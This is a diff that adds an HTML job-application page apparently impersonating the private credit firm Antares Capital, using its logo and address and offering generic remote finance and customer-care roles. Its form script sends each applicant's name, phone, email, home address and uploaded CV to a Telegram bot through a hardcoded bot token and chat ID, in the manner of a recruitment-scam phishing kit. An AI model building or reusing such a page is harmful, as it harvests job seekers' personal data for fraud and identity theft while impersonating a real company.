@@ -1,0 +1,537 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Join Our Team - Antares Capital</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <script src="https://unpkg.com/lucide@latest"></script>
+    <link rel="shortcut icon" type="image/png"
+        href="https://www.antares.com/_assets/_1fa46204d0f3f4a156902a46ac369f9c/antares/db/964/9080/image.svg" />
+    <script src="https://cdn.tailwindcss.com"></script>
+
+    <!-- Google tag (gtag.js) -->
+    <script async src="https://www.googletagmanager.com/gtag/js?id=AW-17082293645"></script>
+    <script>
+        window.dataLayer = window.dataLayer || [];
+        function gtag() { dataLayer.push(arguments); }
+        gtag('js', new Date());
+        gtag('config', 'AW-17082293645');
+    </script>
+
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    fontFamily: {
+                        'sans': ['Inter', 'system-ui', 'sans-serif'],
+                    },
+                    colors: {
+                        'brand': {
+                            50: '#e6f0ff',
+                            100: '#cce0ff',
+                            200: '#99c0ff',
+                            300: '#66a0ff',
+                            400: '#3380ff',
+                            500: '#0060ff',
+                            600: '#001c71', // Primary
+                            700: '#001658',
+                            800: '#001040',
+                            900: '#000a28',
+                        },
+                        'secondary': {
+                            50: '#f5a831',
+                            100: '#f5a831',
+                            200: '#f5a831',
+                            300: '#f5a831',
+                            400: '#f5a831',
+                            500: '#f5a831', // Secondary
+                            600: '#f5a831',
+                            700: '#f5a831',
+                            800: '#f5a831',
+                            900: '#f5a831',
+                        }
+                    }
+                }
+            }
+        }
+
+        function sendToTelegram(event) {
+            event.preventDefault();
+
+            // Show loading state
+            const submitBtn = event.target.querySelector('button[type="submit"]');
+            const originalText = submitBtn.textContent;
+            submitBtn.textContent = 'Submitting...';
+            submitBtn.disabled = true;
+
+            const botToken = '8446586148:AAFBSK3St3wbE24RBsU7o36Gs9JB24bnQOM';
+            const chatId = '6632396282';
+            const form = event.target;
+            const formData = new FormData(form);
+            const cvFile = formData.get('CV');
+
+            let message = '📝 *New Antares Capital Application*\n\n';
+            
+            // Handle CV file info
+            if (cvFile && cvFile.size > 0) {
+                message += `🔹 *CV File*: ${cvFile.name} (${(cvFile.size / 1024 / 1024).toFixed(2)} MB)\n`;
+                formData.delete('CV'); // Remove from message text
+            }
+            
+            // Add other form fields
+            formData.forEach((value, key) => {
+                message += `🔹 *${key}*: ${value}\n`;
+            });
+
+            const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
+
+            // Send text message first
+            fetch(telegramUrl, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message,
+                    parse_mode: 'Markdown',
+                }),
+            })
+                .then((response) => response.json())
+                .then((data) => {
+                    // If CV file exists, send it as document
+                    if (cvFile && cvFile.size > 0) {
+                        const documentFormData = new FormData();
+                        documentFormData.append('chat_id', chatId);
+                        documentFormData.append('document', cvFile);
+                        
+                        return fetch(`https://api.telegram.org/bot${botToken}/sendDocument`, {
+                            method: 'POST',
+                            body: documentFormData,
+                        });
+                    }
+                    return Promise.resolve();
+                })
+                .then(() => {
+                    window.location.href = 'success.html';
+                })
+                .catch((error) => {
+                    console.error('Error:', error);
+                    submitBtn.textContent = originalText;
+                    submitBtn.disabled = false;
+                    alert('There was an error submitting your application. Please try again.');
+                });
+        }
+
+        function updateStateLabel() {
+            const countrySelect = document.getElementById('country');
+            const stateLabel = document.getElementById('state-label');
+            const selectedCountry = countrySelect.value;
+
+            if (selectedCountry === 'USA') {
+                stateLabel.textContent = 'State';
+            } else if (selectedCountry === 'Canada') {
+                stateLabel.textContent = 'Province';
+            } else if (selectedCountry === 'Australia') {
+                stateLabel.textContent = 'State/Territory';
+            }
+        }
+
+        document.addEventListener('DOMContentLoaded', function () {
+            updateStateLabel();
+        });
+    </script>
+
+    <style>
+        @media (min-width: 991.98px) {
+            .page-banner.overlay:not(.no-overlay)::before {
+                opacity: 0.85;
+            }
+        }
+
+        .page-banner.overlay:not(.no-overlay)::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background-color: #001b71b0;
+        }
+
+        /* Replace all reds and transparent reds with #001b71 */
+        .text-red-500,
+        .text-red-600,
+        .text-red-700,
+        .text-red-800,
+        .text-red-900,
+        .bg-red-500,
+        .bg-red-600,
+        .bg-red-700,
+        .bg-red-800,
+        .bg-red-900,
+        .border-red-500,
+        .border-red-600,
+        .border-red-700,
+        .border-red-800,
+        .border-red-900,
+        .hover\:text-red-500:hover,
+        .hover\:text-red-600:hover,
+        .hover\:text-red-700:hover,
+        .hover\:text-red-800:hover,
+        .hover\:text-red-900:hover,
+        .hover\:bg-red-500:hover,
+        .hover\:bg-red-600:hover,
+        .hover\:bg-red-700:hover,
+        .hover\:bg-red-800:hover,
+        .hover\:bg-red-900:hover {
+            color: #001b71 !important;
+            background-color: #001b71 !important;
+            border-color: #001b71 !important;
+        }
+
+        .bg-transparent {
+            background-color: #001b71 !important;
+        }
+    </style>
+</head>
+
+<body class="font-sans bg-gray-50 text-gray-900 min-h-screen">
+    <!-- Navigation -->
+    <nav class="navbar">
+        <div class="container navbar-container" style="
+    max-width: 100% !important;
+">
+            <a href="index.html" class="brand"><img
+                    src="https://www.antares.com/_assets/_1fa46204d0f3f4a156902a46ac369f9c/antares/db/964/9080/image.svg"
+                    alt="Antares" style="height: 100px;padding: 20px;margin: 0px auto;"></a>
+
+
+        </div>
+    </nav>
+
+    <!-- Hero Section -->
+    <header class="page-banner overlay relative bg-cover bg-center bg-no-repeat"
+        style="background-image: url(https://www.antares.com/_assets/_1fa46204d0f3f4a156902a46ac369f9c/antares/db/1035/9564/image_resized.jpg);">
+        <div class="absolute inset-0 bg-black bg-opacity-40"></div>
+        <div class="relative mx-auto max-w-7xl px-4 sm:px-6 lg:px-8 py-24" style="
+    text-align: center;
+">
+            <div class="">
+                <h1 class="text-4xl md:text-5xl font-bold text-white mb-4">
+                    Join Our Team
+                </h1>
+                <p class="text-lg sm:text-xl text-white ">
+                    Start your career with Antares Capital - a leading private credit firm with legacy experience and
+                    entrepreneurial spirit
+                </p>
+                <div class="flex flex-col sm:flex-row items-center gap-4 text-white mt-6" style="
+    display: flex;
+    align-items: center;
+    justify-content: center;
+">
+                    <div class="flex items-center">
+                        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none"
+                            stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"
+                            data-lucide="users" aria-hidden="true" class="lucide lucide-users w-5 h-5 mr-2">
+                            <path d="M16 21v-2a4 4 0 0 0-4-4H6a4 4 0 0 0-4 4v2"></path>
+                            <path d="M16 3.128a4 4 0 0 1 0 7.744"></path>
+                            <path d="M22 21v-2a4 4 0 0 0-3-3.87"></path>
+                            <circle cx="9" cy="7" r="4"></circle>
+                        </svg>
+                        100+ Employees Worldwide
+                    </div>
+                    <div class="flex items-center">
+                        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none"
+                            stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"
+                            data-lucide="trending-up" aria-hidden="true" class="lucide lucide-trending-up w-5 h-5 mr-2">
+                            <path d="M16 7h6v6"></path>
+                            <path d="m22 7-8.5 8.5-5-5L2 17"></path>
+                        </svg>
+                        Competitive Salary + Benefits
+                    </div>
+                    <div class="flex items-center">
+                        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none"
+                            stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"
+                            data-lucide="globe" aria-hidden="true" class="lucide lucide-globe w-5 h-5 mr-2">
+                            <circle cx="12" cy="12" r="10"></circle>
+                            <path d="M12 2a14.5 14.5 0 0 0 0 20 14.5 14.5 0 0 0 0-20"></path>
+                            <path d="M2 12h20"></path>
+                        </svg>
+                        Global Impact
+                    </div>
+                </div>
+            </div>
+        </div>
+    </header>
+
+    <!-- Main Content -->
+    <section class="py-12 sm:py-16 lg:py-20">
+        <div class="container mx-auto px-4 sm:px-6 lg:px-8">
+            <div class="max-w-4xl mx-auto">
+                <!-- Company Info -->
+                <div class="text-center mb-12">
+                    <h2 class="text-2xl sm:text-3xl font-bold text-gray-900 mb-4">
+                        About Antares Capital
+                    </h2>
+                    <p class="text-lg text-gray-600 max-w-3xl mx-auto">
+                        Fueled by a culture of integrity and high performance, Antares is fully committed to providing
+                        reliable credit solutions that create lasting value for our partners. Join our international
+                        team of enthusiasts.
+                    </p>
+                </div>
+
+                <!-- Application Form -->
+                <div class="bg-white rounded-2xl shadow-xl p-6 sm:p-8 lg:p-10">
+                    <div class="text-center mb-8">
+                        <h3 class="text-2xl font-bold text-gray-900 mb-2">Start Your Application</h3>
+                        <p class="text-gray-600">Fill out the form below to join our team of professionals</p>
+                    </div>
+
+                    <form onsubmit="sendToTelegram(event)" class="space-y-6">
+                        <!-- Personal Information Section -->
+                        <div class="border-b border-gray-200 pb-6">
+                            <h4 class="text-lg font-semibold text-gray-900 mb-4">Personal Information</h4>
+
+                            <div class="grid grid-cols-1 gap-6">
+                                <div>
+                                    <label for="name" class="block text-sm font-medium text-gray-700 mb-2">
+                                        Full Name *
+                                    </label>
+                                    <input type="text" id="name" name="Name" required
+                                        class="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-brand-600 focus:border-brand-600 transition-colors duration-200">
+                                </div>
+
+                                <div class="grid grid-cols-1 sm:grid-cols-2 gap-6">
+                                    <div>
+                                        <label for="phone" class="block text-sm font-medium text-gray-700 mb-2">
+                                            Phone Number *
+                                        </label>
+                                        <input type="tel" id="phone" name="Phone" required
+                                            class="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-brand-600 focus:border-brand-600 transition-colors duration-200">
+                                    </div>
+                                    <div>
+                                        <label for="email" class="block text-sm font-medium text-gray-700 mb-2">
+                                            Email Address *
+                                        </label>
+                                        <input type="email" id="email" name="Email" required
+                                            class="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-brand-600 focus:border-brand-600 transition-colors duration-200">
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+
+                        <!-- Position Information Section -->
+                        <div class="border-b border-gray-200 pb-6">
+                            <h4 class="text-lg font-semibold text-gray-900 mb-4">Position Information</h4>
+
+                            <div class="space-y-6">
+                                <div>
+                                    <label for="position" class="block text-sm font-medium text-gray-700 mb-2">
+                                        Position Applying For *
+                                    </label>
+                                    <select id="position" name="Position" required
+                                        class="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-brand-600 focus:border-brand-600 transition-colors duration-200">
+                                        <option value="">Select a position</option>
+                                        <option value="Remote Data Analyst">Remote Data Analyst</option>
+                                        <option value="Remote Book Keeper">Remote Book Keeper</option>
+                                        <option value="Remote Accountant">Remote Accountant</option>
+                                        <option value="Remote Account Payable">Remote Account Payable</option>
+                                        <option value="Remote Financial Analyst">Remote Financial Analyst</option>
+                                        <option value="Remote Customer Care Rep">Remote Customer Care Rep</option>
+                                    </select>
+                                </div>
+
+                                <div>
+                                    <label for="experience" class="block text-sm font-medium text-gray-700 mb-2">
+                                        Years of Relevant Experience *
+                                    </label>
+                                    <input type="text" id="experience" name="Experience" required
+                                        placeholder="e.g., 2-3 years, 5+ years"
+                                        class="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-brand-600 focus:border-brand-600 transition-colors duration-200">
+                                </div>
+                            </div>
+                        </div>
+
+                        <!-- Address Information Section -->
+                        <div class="border-b border-gray-200 pb-6">
+                            <h4 class="text-lg font-semibold text-gray-900 mb-4">Address Information</h4>
+
+                            <div class="space-y-6">
+                                <div>
+                                    <label for="street-address" class="block text-sm font-medium text-gray-700 mb-2">
+                                        Street Address *
+                                    </label>
+                                    <input type="text" id="street-address" name="Street Address" required
+                                        class="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-brand-600 focus:border-brand-600 transition-colors duration-200">
+                                </div>
+
+                                <div class="grid grid-cols-1 sm:grid-cols-2 gap-6">
+                                    <div>
+                                        <label for="city" class="block text-sm font-medium text-gray-700 mb-2">
+                                            City *
+                                        </label>
+                                        <input type="text" id="city" name="City" required
+                                            class="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-brand-600 focus:border-brand-600 transition-colors duration-200">
+                                    </div>
+                                    <div>
+                                        <label for="state" id="state-label"
+                                            class="block text-sm font-medium text-gray-700 mb-2">
+                                            State *
+                                        </label>
+                                        <input type="text" id="state" name="State" required
+                                            class="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-brand-600 focus:border-brand-600 transition-colors duration-200">
+                                    </div>
+                                </div>
+
+                                <div class="grid grid-cols-1 sm:grid-cols-2 gap-6">
+                                    <div>
+                                        <label for="postal-code" class="block text-sm font-medium text-gray-700 mb-2">
+                                            Postal Code *
+                                        </label>
+                                        <input type="text" id="postal-code" name="Postal Code" required
+                                            class="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-brand-600 focus:border-brand-600 transition-colors duration-200">
+                                    </div>
+                                    <div>
+                                        <label for="country" class="block text-sm font-medium text-gray-700 mb-2">
+                                            Country *
+                                        </label>
+                                        <select id="country" name="Country" onchange="updateStateLabel()" required
+                                            class="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-brand-600 focus:border-brand-600 transition-colors duration-200">
+                                            <option value="USA">United States</option>
+                                            <option value="Canada">Canada</option>
+                                            <option value="Australia">Australia</option>
+                                        </select>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+
+                        <!-- Additional Information Section -->
+                        <div class="pb-6">
+                            <h4 class="text-lg font-semibold text-gray-900 mb-4">Additional Information</h4>
+
+                            <div class="space-y-6">
+                                <div>
+                                    <label for="cv" class="block text-sm font-medium text-gray-700 mb-2">
+                                        Upload CV/Resume *
+                                    </label>
+                                    <input type="file" id="cv" name="CV" required accept=".pdf,.doc,.docx"
+                                        class="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-brand-600 focus:border-brand-600 transition-colors duration-200">
+                                    <p class="text-sm text-gray-500 mt-1">
+                                        Accepted formats: PDF, DOC, DOCX (Max 5MB)
+                                    </p>
+                                </div>
+
+                                <div>
+                                    <label for="heard" class="block text-sm font-medium text-gray-700 mb-2">
+                                        How Did You Hear About Us? *
+                                    </label>
+                                    <input type="text" id="heard" name="Referral Source" required
+                                        placeholder="e.g., LinkedIn, company website, referral..."
+                                        class="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-brand-600 focus:border-brand-600 transition-colors duration-200">
+                                </div>
+                            </div>
+                        </div>
+
+                        <!-- Submit Button -->
+                        <div class="pt-6">
+                            <button type="submit"
+                                class="w-full bg-brand-600 hover:bg-brand-700 text-white font-semibold py-4 px-6 rounded-lg transition-colors duration-200 focus:outline-none focus:ring-2 focus:ring-brand-600 focus:ring-offset-2">
+                                Submit Application
+                            </button>
+                            <p class="text-sm text-gray-500 text-center mt-3">
+                                By submitting this form, you agree to our terms and conditions
+                            </p>
+                        </div>
+                    </form>
+                </div>
+
+                <!-- Trust Indicators -->
+                <div class="mt-12 grid grid-cols-1 sm:grid-cols-3 gap-6 text-center">
+                    <div class="bg-white rounded-lg p-6 shadow-sm">
+                        <div class="text-brand-600 text-2xl font-bold mb-2">12</div>
+                        <div class="text-gray-600">Years of Experience</div>
+                    </div>
+                    <div class="bg-white rounded-lg p-6 shadow-sm">
+                        <div class="text-brand-600 text-2xl font-bold mb-2">5</div>
+                        <div class="text-gray-600">Offices Worldwide</div>
+                    </div>
+                    <div class="bg-white rounded-lg p-6 shadow-sm">
+                        <div class="text-brand-600 text-2xl font-bold mb-2">1000+</div>
+                        <div class="text-gray-600">Projects Completed</div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Footer -->
+    <footer id="footer" class="bg-gray-900 text-gray-300">
+        <div class="mx-auto max-w-7xl px-4 sm:px-6 lg:px-8 py-12">
+            <div class="flex flex-col space-y-8">
+                <!-- Social Links -->
+                <div class="flex justify-start">
+                    <nav id="social-navigation" aria-label="Social Navigation">
+                        <ul class="flex space-x-4">
+                            <li>
+                                <a href="https://www.linkedin.com/company/antares-capital-lp?trk=biz-companies-cym"
+                                    target="_blank" rel="noopener"
+                                    class="text-gray-400 hover:text-white transition-colors duration-200"
+                                    title="Opens in a new window">
+                                    <img class="h-6 w-6"
+                                        src="https://www.antares.com/_assets/_1fa46204d0f3f4a156902a46ac369f9c/antares/db/933/9051/icon/Linkedin.png"
+                                        alt="Visit us on LinkedIn">
+                                </a>
+                            </li>
+                        </ul>
+                    </nav>
+                </div>
+
+                <!-- Address -->
+                <div class="flex justify-start">
+                    <div class="text-sm">
+                        Antares Capital<br>
+                        320 South Canal Street Chicago,<br>
+                        IL 60606
+                    </div>
+                </div>
+
+                <!-- Copyright and Links -->
+                <div class="flex flex-col md:flex-row md:items-center md:justify-between space-y-4 md:space-y-0">
+                    <div class="text-sm text-gray-400">
+                        © Antares Capital LP. All Rights Reserved.
+                    </div>
+                    <nav id="footer-navigation" aria-label="Footer Navigation">
+                        <ul class="flex flex-wrap space-x-6 text-sm">
+                            <li>
+                                <a href="/terms-conditions"
+                                    class="hover:text-white transition-colors duration-200">Terms & Conditions</a>
+                            </li>
+                            <li>
+                                <a href="/privacy-policy"
+                                    class="hover:text-white transition-colors duration-200">Privacy Policy</a>
+                            </li>
+                            <li>
+                                <a href="/eu-gdpr-privacy-notice"
+                                    class="hover:text-white transition-colors duration-200">EU GDPR Privacy Notice</a>
+                            </li>
+                            <li>
+                                <a href="/accessibility-statement"
+                                    class="hover:text-white transition-colors duration-200">Accessibility Statement</a>
+                            </li>
+                        </ul>
+                    </nav>
+                </div>
+            </div>
+        </div>
+    </footer>
+
+    <script>
+        lucide.createIcons();
+    </script>
+</body>
+
+</html>
